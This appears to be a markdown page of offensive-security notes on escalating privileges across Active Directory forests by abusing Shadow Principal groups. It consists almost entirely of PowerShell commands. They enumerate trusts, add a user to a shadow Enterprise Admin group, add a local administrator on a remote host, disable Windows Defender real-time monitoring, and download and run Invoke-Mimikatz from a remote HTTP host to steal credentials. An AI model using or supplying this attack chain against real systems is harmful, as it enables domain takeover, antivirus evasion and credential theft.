
### Enumeration
```
Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}} -Session $secdc
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * 

Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * } -Session $Credential
```

### To Identify who a Shadow Principal priviledge has

![SSO](https://raw.githubusercontent.com/NyaMeeEain/Infrastructure-Assessment/master/Lateral%20Movement/Across%20Forest%20%20Domain%20Privilege%20Escalation/Images/1.png)

```
Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid } -Session $Credential

```

### Attacking

![SSO](https://raw.githubusercontent.com/NyaMeeEain/Infrastructure-Assessment/master/Lateral%20Movement/Across%20Forest%20%20Domain%20Privilege%20Escalation/Images/2.png)
![SSO](https://raw.githubusercontent.com/NyaMeeEain/Infrastructure-Assessment/master/Lateral%20Movement/Across%20Forest%20%20Domain%20Privilege%20Escalation/Images/3.png)
![SSO](https://raw.githubusercontent.com/NyaMeeEain/Infrastructure-Assessment/master/Lateral%20Movement/Across%20Forest%20%20Domain%20Privilege%20Escalation/Images/4.png)


```
Invoke-Command -ScriptBlock {Set-ADObject -Identity "CN=xxxx-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=xxxx,DC=xxxx" -Add @{'member'="CN=xxx,CN=Users,DC=xxxx,DC=xxxx"}


Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock{[System.Security.Principal.WindowsIdentity]::GetCurrent() | Format-Table -auto } -Computername 192.168.79.189 -Credential Domain\NyaMeeEain -Authentication Negotiate} -Session $secdc

Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock{net localgroup administrators NyaMeeEain /add } -Computername 192.168.x.x  -Credential Domain\NyaMeeEain -Authentication Negotiate} -Session $secdc 

Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealtimeMonitoring $true} -Computername 192.168.x,x -Credential Domain\NyaMeeEain -Authentication Negotiate} -Session $secdc 

Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock{iex (iwr -UseBasicParsing http://192.168.x.x/Invoke-Mimikatz.ps1)} -Computername 192.168.79.189 -Credential Domain\NyaMeeEain -Authentication Negotiate} -Session $secdc 
```
